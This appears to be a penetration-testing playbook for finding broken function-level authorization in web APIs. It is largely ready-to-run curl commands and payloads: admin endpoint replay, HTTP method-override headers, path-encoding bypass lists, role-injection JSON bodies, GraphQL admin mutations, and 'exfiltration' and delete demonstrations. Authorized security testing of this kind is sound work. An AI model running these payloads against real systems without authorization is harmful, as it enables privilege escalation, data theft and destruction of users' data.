# Broken Function-Level Authorization (BFLA) — Vulnerability Skill

**Phase:** 3 | **Skill Type:** Testing | **Impact:** Critical | **Prerequisite:** Two accounts with different privilege levels (regular + admin) mapped in Phase 2, API endpoints enumerated

---

## Mental Model

BFLA is the *vertical* privilege escalation bug — a regular user can call admin-only functions. Developers enforce authorization in the UI and navigation layer but forget it on the API. They assume the admin panel's HTML buttons are the only way to call admin endpoints, so the endpoint itself has no role check.

**The core assumption you're violating:** "Users can only reach functions through the interface we show them."

**How elite hunters think about BFLA:**
- Authorization is a *per-function* property, not a per-page one. Every HTTP method on every path needs its own check.
- The UI hides buttons, but the API behind them is still reachable. `GET /api/admin/users` works whether or not you can see the "Users" menu.
- Developers protect the *reading* endpoint but forget `PUT`/`DELETE`/`POST` variants, or vice versa.
- Versioned/alternate API paths (`/v2/`, `/internal/`, `/admin/`) often lack the authz checks the main path has.
- GraphQL and REST both suffer: the mutation is the function, not the route.

**BFLA vs IDOR:** IDOR (BOLA) is horizontal — object-level. BFLA is vertical — function-level. A regular user hitting `/api/admin/delete-user` is BFLA even if the user ID is fixed.

---

## Phase 1: OOB-First Detection (MANDATORY)

BFLA doesn't produce OOB callbacks itself, but OOB confirms you actually reached the admin function's *side effect* (email dispatch, webhook, external fetch) when response codes are misleading:

```bash
./tools/interactsh_launcher.sh start --output-dir engagement/oob/
OOB_URL=$(cat engagement/oob/oob_url.txt)
```

Inject the OOB URL into any admin function that triggers outbound actions:
- Email/notification triggers (reset admin password, alert configs)
- Webhook configuration endpoints (`webhook_url=$OOB_URL`)
- URL import / report generation admin functions

```bash
curl -X POST https://target.com/api/admin/webhooks \
  -H "Cookie: <REGULAR_USER_SESSION>" \
  -d "url=$OOB_URL&event=user.login"
```

```bash
./tools/interactsh_launcher.sh poll --output-dir engagement/oob/ --timeout 30
```

If a callback arrives while using a **regular** user session → you reached an admin-only side effect. CONFIRMED. Skip to Phase 4.

---

## Phase 2: Confirmation

### 2.1 Establish Privilege Baselines (CRITICAL FIRST STEP)

You need BOTH accounts to distinguish BFLA from "endpoint is public anyway":

```bash
# Baseline A: admin session (the expected result)
curl -s -H "Cookie: <ADMIN_SESSION>" https://target.com/api/admin/users -o /tmp/baseline_admin.json
# Baseline B: regular session
curl -s -H "Cookie: <REGULAR_SESSION>" https://target.com/api/admin/users -o /tmp/baseline_regular.json
# Baseline C: unauthenticated
curl -s https://target.com/api/admin/users -o /tmp/baseline_anon.json
```

If regular == admin response → BFLA confirmed immediately. If regular == anon → endpoint might be public (different bug, still reportable). Use `python3 tools/response_diff.py --mode compare` for automated comparison.

### 2.2 Direct Admin Endpoint Access (Primary Test)

From the Phase 2 mapping output, take every admin route and every API route, and replay them with the regular session:

```bash
for path in /api/admin/users /api/admin/settings /api/admin/roles /admin/users \
            /api/v1/admin /internal/users /dashboard/admin /api/user/delete; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -H "Cookie: <REGULAR_SESSION>" "https://target.com$path")
  echo "$path -> $code"
done
```

Any 200/201/204 with data instead of 401/403/302 → BFLA.

### 2.3 HTTP Method Tampering

The function check may exist only on `GET`:

```bash
curl -X PUT  -H "Cookie: <REGULAR_SESSION>" https://target.com/api/admin/users
curl -X POST -H "Cookie: <REGULAR_SESSION>" https://target.com/api/admin/users
curl -X DELETE -H "Cookie: <REGULAR_SESSION>" https://target.com/api/admin/users/1
curl -X PATCH -H "Cookie: <REGULAR_SESSION>" https://target.com/api/admin/users/1
```

Try method override headers when the method itself is blocked:

```bash
curl -X POST -H "X-HTTP-Method-Override: DELETE" -H "Cookie: <REGULAR_SESSION>" https://target.com/api/admin/users/1
curl -X POST -H "X-Method-Override: DELETE"     -H "Cookie: <REGULAR_SESSION>" https://target.com/api/admin/users/1
curl -X POST -H "_method: DELETE"               -H "Cookie: <REGULAR_SESSION>" https://target.com/api/admin/users/1
```

### 2.4 Path Normalization & Alternate Routes

Route-based authz is bypassed when the WAF/proxy normalizes a path differently than the authz middleware:

```bash
# Case tricks
/Admin/Users  /ADMIN/users  /api/Admin

# Trailing slash / dot
/api/admin/users.  /api/admin/users/..%2f

# Encoding
%61dmin  /api/%61dmin/users  /api/admin%2fusers

# Path traversal normalization
/api/admin/../user/delete  /api/admin/users/../../admin/users

# Semicolon (Java/Tomcat routing)
/api/admin;/users  /admin/users;/foo
```

### 2.5 Role Parameter & Body Manipulation

Server-side role derived from client-supplied data:

```bash
curl -X POST https://target.com/api/user/update \
  -H "Cookie: <REGULAR_SESSION>" \
  -d '{"email":"t@t.com","role":"admin","is_admin":true,"isAdmin":true,"permissions":["*"]}'

# JSON array type confusion (some parsers pick last)
curl -X POST https://target.com/api/user/update \
  -H "Cookie: <REGULAR_SESSION>" \
  -d '{"role":["user","admin"]}'
```

### 2.6 GraphQL Admin Mutations

If a GraphQL endpoint exists, admin mutations may lack function-level checks:

```graphql
mutation { deleteUser(id: "1") { id } }
query { allUsers { email role } }
```

Test with the regular session. Introspection-enabled endpoints make enumeration trivial.

---

## Phase 3: Negative Verdict (MANDATORY GATE)

**DO NOT declare BFLA negative without:**

1. Testing **every** admin/privileged function from the mapping profile with the regular session (not just a sample)
2. Testing **all HTTP methods** (GET, POST, PUT, PATCH, DELETE, OPTIONS) on each
3. Trying method-override headers
4. Trying path normalization, case, and encoding variants
5. Confirming the regular account genuinely returns 401/403/302 on all of them
6. Re-running `response_diff.py` — if regular response matches the **anon** baseline, the endpoint is public (report as informational/weak authz, not BFLA)
7. Confirming the session stayed valid during testing (replay the admin baseline — it must still return 200)

If regular == admin on even ONE privileged function → NOT negative. Escalate to MEDIUM/HIGH confidence.

---

## Phase 4: Exploitation

Once one admin function is reachable, map the blast radius — the goal is a reportable impact, not just "I can call it":

### 4.1 Privilege Escalation Chain
1. Use the exposed admin function to escalate the **regular account itself** (role update, permission grant)
2. Then re-test with the newly promoted account to unlock *more* functions
3. Document the exact before/after access

### 4.2 Data Exfiltration Demo
```bash
# Pull the full admin dataset with the regular session
curl -s -H "Cookie: <REGULAR_SESSION>" https://target.com/api/admin/users -o /tmp/leak.json
wc -c /tmp/leak.json            # size
jq 'length' /tmp/leak.json      # record count
jq '.[0]' /tmp/leak.json        # sample — redact sensitive fields in report
```

### 4.3 Destructive Function (test only on test data)
```bash
# Create a test user, then attempt delete via regular session
curl -X POST -H "Cookie: <REGULAR_SESSION>" https://target.com/api/admin/users -d '{"email":"bfla-test@test.com"}'
curl -X DELETE -H "Cookie: <REGULAR_SESSION>" https://target.com/api/admin/users/bfla-test@test.com
```

**Stop condition:** First demonstrated unauthorized admin action with evidence. Document and stop — do NOT enumerate all users' data beyond what's needed to prove impact.

---

## What You DO
- Set up regular + admin + anon baselines FIRST, before any probing
- Replay every admin function with the regular session
- Test all HTTP methods, method-override headers, path normalization, and case variants
- Test GraphQL mutations for missing function-level checks
- Use `response_diff.py` to compare baselines instead of eyeballing
- Escalate to a privileged action (role change / data read / delete on test data) to prove impact

## What You DO NOT Do
- Confuse BFLA with IDOR — object IDs don't matter here; the *function* is the bug
- Stop at "UI hides the button" — always probe the API behind the button
- Report an endpoint as BFLA when the regular and anon responses are identical (that's public data exposure, different severity)
- Delete or modify real production data while proving impact — use test accounts
- Skip the negative-verdict gate because you "feel" the API is protected

---

## Cross-Skill Links
- [[idor]] — Horizontal counterpart; check both on every resource endpoint
- [[business-logic]] — Role/privilege manipulation often overlaps with logic flaws
- [[mfa-bypass]] — Post-auth bypass often reveals function-level flaws
- [[graphql]] — GraphQL admin mutations are a common BFLA surface
